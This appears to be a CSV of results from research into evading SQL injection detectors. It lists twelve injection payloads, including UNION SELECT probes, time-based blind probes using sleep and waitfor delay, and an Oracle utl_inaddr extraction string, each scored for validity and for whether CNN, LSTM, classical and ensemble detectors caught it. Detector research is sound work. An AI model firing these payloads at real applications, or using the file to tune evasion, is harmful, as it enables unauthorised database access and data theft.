,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
0,"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,1,0,0,0,0,0
1,"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666","1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666",1,1,0,0,0,0,0
2,-3136%') or 3400=6002,-3136%') or 3400=6002,1,1,0,0,0,0,0
3,1) where 7956=7956 or sleep(5)#,1) where 7956=7956 or sleep(5)#,0,1,0,0,0,0,0
4,-7387'))) order by 1--,-7387'))) order by 1--,1,1,0,0,0,0,0
5,1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,1,1,0,0,0,0,0
6,"1))) union all select null,null,null#","1))) union all select null,null,null#",1,1,0,0,0,0,0
7,"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--","-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",1,1,0,0,0,0,0
8,"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw","1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw",1,1,0,0,0,0,0
9,"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240","1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",1,1,0,0,1,0,0
10,-2604)) as sekb where 6897=6897 or 1000=7683,-2604)) as sekb where 6897=6897 or 1000=7683,0,1,0,0,0,0,0
11,"1%""))) waitfor delay '0:0:5'--","1%""))) waitfor delay '0:0:5'--",1,1,0,0,0,0,0
